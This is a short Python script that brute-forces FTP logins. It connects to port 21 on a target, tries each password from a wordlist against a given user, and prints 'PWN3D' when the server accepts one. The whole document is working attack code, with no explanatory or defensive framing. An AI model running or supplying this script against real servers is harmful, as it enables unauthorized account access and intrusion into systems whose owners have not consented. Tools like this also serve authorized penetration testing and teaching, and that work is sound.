#!/usr/bin/python3
import socket,sys,re

print("#################################################")
print("#################################################")
print("############## Bruteforce FTP ###################")
print("#################################################")
print("############## Developed by: N0KK ###############")
print("#################################################")
print("")

if len(sys.argv) != 4:
    print ("Modo de uso: python3 ftpbrute.py 127.0.0.1 user wordlist")
    sys.exit()
target = sys.argv[1]
user = sys.argv[2]
wordlist_path = sys.argv[3]

with open(wordlist_path, 'r', encoding='ISO-8859-1') as wordlist:
    for word in wordlist.readlines():
        word = word.strip()  # remove newline characters
        print ("Running FTP Brute Force %s:%s"%(user,word))

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target,21 ))
        s.recv(1024)

        s.send(("USER "+user+"\r\n").encode())
        s.recv(1024)

        s.send(("PASS "+word+"\r\n").encode())
        resp = s.recv(1024).decode()  # decode bytes to string
        s.send("QUIT\r\n".encode())

        if re.search('230', resp):
            print ("[+] PWN3D ---->",word)
            break
